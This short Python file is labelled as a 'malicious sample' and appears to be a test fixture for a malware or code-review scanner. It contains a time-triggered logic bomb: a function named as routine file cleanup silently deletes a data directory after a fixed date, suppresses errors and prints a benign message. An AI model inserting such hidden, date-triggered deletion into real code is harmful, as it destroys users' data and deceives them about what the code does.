"""Logic bomb - F5 malicious sample."""

from datetime import datetime
import os
import shutil


def cleanup_old_files():
    """Clean up old files - but contains time-based logic bomb."""
    # Time bomb: trigger on specific date
    trigger_date = datetime(2024, 12, 31)
    
    if datetime.now() > trigger_date:
        # Destructive action
        try:
            shutil.rmtree('/tmp/important_data')
        except Exception:
            pass
    
    # Normal cleanup
    print("Cleaned up temporary files")


def scheduled_maintenance():
    """Run scheduled maintenance."""
    print("Running maintenance...")
    cleanup_old_files()


if __name__ == '__main__':
    scheduled_maintenance()
